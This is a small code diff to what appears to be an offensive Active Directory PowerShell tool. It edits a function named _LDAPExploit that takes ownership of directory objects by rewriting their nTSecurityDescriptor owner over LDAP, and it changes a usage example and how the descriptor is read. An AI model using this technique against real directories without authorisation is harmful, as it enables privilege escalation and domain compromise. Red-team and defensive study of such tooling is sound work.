@@ -10721,9 +10721,9 @@ function _LDAPExploit {
 
         .EXAMPLE
 
-            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'Owner' -OwnerSID 'S-1-1-0' -TargetDN 'CN=Kinda KO. OWNED,CN=Users,DC=X'
+            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'Owner' -OwnerSID 'S-1-5-21-[...]-1103' -TargetDN 'CN=Kinda KO. OWNED,CN=Users,DC=X'
 
-            Sets the owner of `Kinda KO. OWNED` to the entity with SID `S-1-1-0`. In other words, `Everyone` becomes the owner of `Kinda KO. OWNED`.
+            Sets the owner of `Kinda KO. OWNED` to the entity with SID `S-1-5-21-[...]-1103`. In other words, principal with RID 1103 becomes the owner of `Kinda KO. OWNED`.
 
             - This requires WRITE privileges against the target's `nTSecurityDescriptor` attribute
 
@@ -10928,7 +10928,7 @@ function _LDAPExploit {
             Write-Verbose "[*$Exploit*] [*] Setting '$OwnerSID' As Owner Of Target '$TargetDN'..."
             
             # Locally editing the target's nTSecurityDescriptor's owner
-            $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'nTSecurityDescriptor' -Raw
+            $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'nTSecurityDescriptor'
             $SD.Owner = [System.Security.Principal.SecurityIdentifier]::new(
                 $OwnerSID
             )
